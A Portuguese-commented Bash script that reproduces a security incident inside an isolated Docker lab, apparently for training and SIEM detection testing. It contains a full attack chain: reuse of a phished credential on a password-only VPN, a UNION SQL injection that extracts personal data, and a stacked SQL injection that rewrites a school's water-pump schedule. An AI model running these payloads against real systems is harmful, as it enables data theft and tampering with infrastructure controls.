#!/usr/bin/env bash
# Reprodução controlada do incidente INC-VA-0712 (RT-14) — SOMENTE no laboratório isolado.
#
# Encena, contra os próprios containers legados deste repositório (perfil "legado"), a mesma
# cadeia do incidente para gerar evidências reais no SIEM e no banco:
#   1. credencial obtida por phishing (reusada na VPN legada só-senha)
#   2. login na VPN legada de um IP externo, de madrugada
#   3. acesso ao painel legado e SQL Injection no histórico de acessos (extração + alteração da agenda da bomba)
#   4. verificação do impacto
# Nada aqui alcança sistemas de terceiros: origem e alvos estão em redes Docker internas.
#
# Uso:  attack/inc-va-0712.sh            (passo a passo)
#       SLEEP=0 attack/inc-va-0712.sh    (sem pausas)
set -uo pipefail
cd "$(dirname "$0")/.."
SLEEP="${SLEEP:-2}"
EXZID="externo"                      # container que representa a estação do atacante (172.30.99.66)
LEG_PAINEL="https://172.30.30.80:9443"  # painel legado (rede plana da nuvem, via VPN legada)
STAMP() { date -u +%FT%TZ; }
say() { printf '\n\033[1;31m[%s] %s\033[0m\n' "$(STAMP)" "$*"; }
ex() { docker compose exec -T "$EXZID" sh -c "$*"; }
pause() { [ "$SLEEP" = 0 ] || sleep "$SLEEP"; }

VICTIM="${VICTIM:-diego.op}"
PW=$(awk -v u="$VICTIM" '$1==u{sub("senha=","",$3);print $3}' secrets/operadores.txt)
[ -n "$PW" ] || { echo "credencial de laboratório não encontrada (rode make bootstrap/up)"; exit 1; }

say "FASE 1 — Credencial de '$VICTIM' obtida por phishing (reuso na VPN legada só-senha)"
pause

say "FASE 2 — Conectar na VPN legada (OpenVPN, só usuário/senha, sem MFA) de IP externo"
ex "mkdir -p /dev/net; [ -c /dev/net/tun ] || mknod /dev/net/tun c 10 200
    printf '%s\n%s\n' '$VICTIM' '$PW' > /tmp/cred
    cat > /tmp/c.ovpn <<CONF
client
dev tun
proto udp
remote 172.30.99.3 1194
auth-user-pass /tmp/cred
auth-nocache
<ca>
$(cat pki/out/ca-chain.crt)
</ca>
remote-cert-tls server
CONF
    (openvpn --config /tmp/c.ovpn --log /tmp/ovpn.log --daemon; sleep 6)
    ip route add 172.30.30.0/24 dev tun0 2>/dev/null || true
    ip addr show tun0 2>/dev/null | awk '/inet /{print \"  VPN conectada, IP do túnel:\", \$2}' || (echo falhou; tail -5 /tmp/ovpn.log)"
pause

say "FASE 3 — Alcançar o painel legado e extrair a tabela de usuários via SQL Injection"
echo "  3a. Confirmar rota para a nuvem pelo túnel"
ex "curl -sk -o /dev/null -w '  painel legado: HTTP %{http_code}\n' $LEG_PAINEL/login"
echo "  3b. Autenticar com a credencial roubada"
ex "curl -sk -c /tmp/jar -b /tmp/jar -o /dev/null -w '  login painel: HTTP %{http_code}\n' \
      --data 'username=$VICTIM&password=$PW' $LEG_PAINEL/login"
pause
echo "  3c. SQLi UNION — extrair nome/e-mail/telefone do cadastro"
ex "curl -sk -b /tmp/jar -G $LEG_PAINEL/acessos \
      --data-urlencode \"q=x' UNION SELECT now(),nome,email,telefone,true,papel FROM cadastro.pessoas--\" \
      | grep -oE '<td>[^<]+@[^<]+</td>' | head -5 | sed 's/^/    vazado: /'"
pause
echo "  3d. SQLi empilhado — alterar a agenda da bomba da escola (como no incidente)"
ex "curl -sk -b /tmp/jar -o /dev/null -G $LEG_PAINEL/acessos \
      --data-urlencode \"q=x'; UPDATE ops.pump_schedule SET windows='03:00-03:05', updated_by='$VICTIM' WHERE site='escola';--\""
echo "    agenda alterada via injeção."
pause

say "FASE 4 — Impacto e rastros"
echo "  A borda da escola recebe a nova agenda como comando set_schedule e a valida localmente:"
sleep 6
docker compose exec -T db psql -U postgres -d vilaaurora -tAc \
  "select action,status,coalesce(result->>'reason','(pendente)') from ops.commands where action='set_schedule' order by created_at desc limit 1" | sed 's/^/    /'
echo "  Agenda efetiva da bomba da escola (deve seguir protegida pelo intertravamento da borda):"
docker compose exec -T db psql -U postgres -d vilaaurora -tAc "select site,windows from ops.pump_schedule where site='escola'" | sed 's/^/    /'

say "FIM — evidências geradas no SIEM (regras a/b/d) e nos logs. Veja: make soc / forensics/coletar.sh"
ex "pkill openvpn 2>/dev/null; true" >/dev/null 2>&1
# restaura a agenda para não afetar outras demonstrações
docker compose exec -T db psql -U postgres -d vilaaurora -tAc \
  "update ops.pump_schedule set windows='05:00-07:00,17:00-19:00', updated_by='pos-demo' where site='escola'" >/dev/null 2>&1
